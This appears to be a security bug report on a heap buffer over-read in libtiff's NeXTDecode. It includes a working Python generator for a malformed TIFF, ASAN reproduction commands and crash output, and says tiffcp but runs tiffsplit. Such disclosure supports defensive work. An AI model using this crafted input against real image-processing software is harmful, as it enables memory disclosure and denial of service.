## Bug0: NeXTDecode Heap Buffer Overflow via Exhausted Compressed Data

In `NeXTDecode()` in `libtiff/tif_next.c`, the per-scanline type byte is read unconditionally at line 69 (`n = *bp++, cc--`) without first checking whether the raw compressed buffer is exhausted, and when `cc` wraps to `-1` the only remaining guard (`if (cc == 0) goto bad`) is permanently bypassed, enabling unbounded out-of-bounds reads from the heap.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

TIFF_LITTLEENDIAN       = 0x4949
TIFF_MAGIC              = 42

TAG_IMAGEWIDTH          = 256
TAG_IMAGELENGTH         = 257
TAG_BITSPERSAMPLE       = 258
TAG_COMPRESSION         = 259
TAG_PHOTOMETRIC         = 262
TAG_FILLORDER           = 266
TAG_STRIPOFFSETS        = 273
TAG_SAMPLESPERPIXEL     = 277
TAG_ROWSPERSTRIP        = 278
TAG_STRIPBYTECOUNTS     = 279

TYPE_SHORT  = 3
TYPE_LONG   = 4

COMPRESSION_NEXT    = 32766
FILLORDER_LSB2MSB   = 2

IMAGE_WIDTH     = 1024
IMAGE_LENGTH    = 2
ROWS_PER_STRIP  = 2
STRIP_BYTECOUNT = IMAGE_WIDTH   # 1024

STRIP_DATA = bytes([0x80] * STRIP_BYTECOUNT)

def ifd_entry(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)

def build_tiff():
    n_entries    = 10
    header_size  = 8
    ifd_size     = 2 + n_entries * 12 + 4
    ifd_offset   = header_size
    strip_offset = ifd_offset + ifd_size   # 134

    entries = b''
    entries += ifd_entry(TAG_IMAGEWIDTH,       TYPE_LONG,  1, IMAGE_WIDTH)
    entries += ifd_entry(TAG_IMAGELENGTH,      TYPE_LONG,  1, IMAGE_LENGTH)
    entries += ifd_entry(TAG_BITSPERSAMPLE,    TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_COMPRESSION,      TYPE_SHORT, 1, COMPRESSION_NEXT)
    entries += ifd_entry(TAG_PHOTOMETRIC,      TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_FILLORDER,        TYPE_SHORT, 1, FILLORDER_LSB2MSB)
    entries += ifd_entry(TAG_STRIPOFFSETS,     TYPE_LONG,  1, strip_offset)
    entries += ifd_entry(TAG_SAMPLESPERPIXEL,  TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_ROWSPERSTRIP,     TYPE_LONG,  1, ROWS_PER_STRIP)
    entries += ifd_entry(TAG_STRIPBYTECOUNTS,  TYPE_LONG,  1, STRIP_BYTECOUNT)

    header = struct.pack('<HHI', TIFF_LITTLEENDIAN, TIFF_MAGIC, ifd_offset)
    ifd    = struct.pack('<H', n_entries) + entries + struct.pack('<I', 0)
    return header + ifd + STRIP_DATA

if __name__ == '__main__':
    tiff_bytes = build_tiff()
    with open('poc_input.tif', 'wb') as fh:
        fh.write(tiff_bytes)
    print(f"[+] Written {len(tiff_bytes)} bytes to poc_input.tif")
    print("    FillOrder=2 forces heap path; StripByteCounts=1024 -> exact heap alloc")
    print("    Strip: 0x80*1024 -> after TIFFReverseBits: 0x01*1024 (1 px/code)")
    print("    Scanline 0 consumes all 1024 bytes; scanline 1 reads byte[1024] = ASAN red zone")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000e80 at pc 0x7f55b5498a4d bp 0x7fff1a195410 sp 0x7fff1a195400
READ of size 1 at 0x519000000e80 thread T0
    #0 in NeXTDecode tif_next.c:69
    #1 in TIFFReadEncodedStrip
0x519000000e80 is located 0 bytes to the right of 1024-byte region [0x519000000a80, 0x519000000e80)

### Impact

An attacker who supplies a crafted TIFF file with NeXT compression (tag value 32766) can trigger unbounded out-of-bounds heap reads in `NeXTDecode`, disclosing adjacent heap contents such as internal pointers or other image data. When the out-of-bounds reads reach an unmapped memory page the process receives SIGSEGV, causing reliable denial of service in any application that decodes NeXT-compressed TIFF images. The attack requires only that the target application open and decode an attacker-supplied TIFF file, which is a common operation in image viewers, media processors, and document conversion pipelines.
